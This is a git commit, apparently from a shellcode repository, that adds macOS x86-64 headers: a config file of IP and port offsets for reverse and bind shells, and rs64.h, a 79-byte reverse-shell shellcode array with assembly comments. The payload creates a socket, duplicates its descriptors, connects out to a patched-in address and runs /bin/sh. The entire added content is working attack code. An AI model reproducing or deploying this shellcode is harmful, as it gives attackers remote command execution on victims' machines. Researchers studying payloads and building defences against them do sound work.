d64eca2cc9bbc17343a2373858ee9535a783a584
Odzhan <odzhan@protonmail.com>
2017-07-26 20:35:25 +0100

    upd

---
+++ osx/cfg64.h
@@ -0,0 +1,5 @@
+#define RS_IP_OFS    6
+#define RS_PORT_OFS  2
+
+#define BS_IP_OFS    6
+#define BS_PORT_OFS  2
---
+++ osx/rs64.h
@@ -0,0 +1,46 @@
+
+#define RS_SIZE 79
+
+char RS[] = {
+  /* 0000 */ "\x48\xb9\xff\xfd\xfb\x2d\x80\xff\xff\xfe" /* mov rcx, 0xfeffff802dfbfdff */
+  /* 000A */ "\x48\xf7\xd1"                             /* not rcx                     */
+  /* 000D */ "\x51"                                     /* push rcx                    */
+  /* 000E */ "\x31\xed"                                 /* xor ebp, ebp                */
+  /* 0010 */ "\x0f\xba\xed\x19"                         /* bts ebp, 0x19               */
+  /* 0014 */ "\x55"                                     /* push rbp                    */
+  /* 0015 */ "\x58"                                     /* pop rax                     */
+  /* 0016 */ "\x99"                                     /* cdq                         */
+  /* 0017 */ "\x6a\x01"                                 /* push 0x1                    */
+  /* 0019 */ "\x5e"                                     /* pop rsi                     */
+  /* 001A */ "\x6a\x02"                                 /* push 0x2                    */
+  /* 001C */ "\x5f"                                     /* pop rdi                     */
+  /* 001D */ "\xb0\x61"                                 /* mov al, 0x61                */
+  /* 001F */ "\x0f\x05"                                 /* syscall                     */
+  /* 0021 */ "\x97"                                     /* xchg edi, eax               */
+  /* 0022 */ "\x96"                                     /* xchg esi, eax               */
+  /* 0023 */ "\x55"                                     /* push rbp                    */
+  /* 0024 */ "\x58"                                     /* pop rax                     */
+  /* 0025 */ "\xb0\x5a"                                 /* mov al, 0x5a                */
+  /* 0027 */ "\x0f\x05"                                 /* syscall                     */
+  /* 0029 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
+  /* 002C */ "\x79\xf5"                                 /* jns 0x23                    */
+  /* 002E */ "\x55"                                     /* push rbp                    */
+  /* 002F */ "\x58"                                     /* pop rax                     */
+  /* 0030 */ "\x54"                                     /* push rsp                    */
+  /* 0031 */ "\x5e"                                     /* pop rsi                     */
+  /* 0032 */ "\xb2\x10"                                 /* mov dl, 0x10                */
+  /* 0034 */ "\xb0\x62"                                 /* mov al, 0x62                */
+  /* 0036 */ "\x0f\x05"                                 /* syscall                     */
+  /* 0038 */ "\x50"                                     /* push rax                    */
+  /* 0039 */ "\x5e"                                     /* pop rsi                     */
+  /* 003A */ "\x55"                                     /* push rbp                    */
+  /* 003B */ "\x58"                                     /* pop rax                     */
+  /* 003C */ "\x99"                                     /* cdq                         */
+  /* 003D */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rbx, 0x68732f2f6e69622f */
+  /* 0047 */ "\x52"                                     /* push rdx                    */
+  /* 0048 */ "\x53"                                     /* push rbx                    */
+  /* 0049 */ "\x54"                                     /* push rsp                    */
+  /* 004A */ "\x5f"                                     /* pop rdi                     */
+  /* 004B */ "\xb0\x3b"                                 /* mov al, 0x3b                */
+  /* 004D */ "\x0f\x05"                                 /* syscall                     */
+};
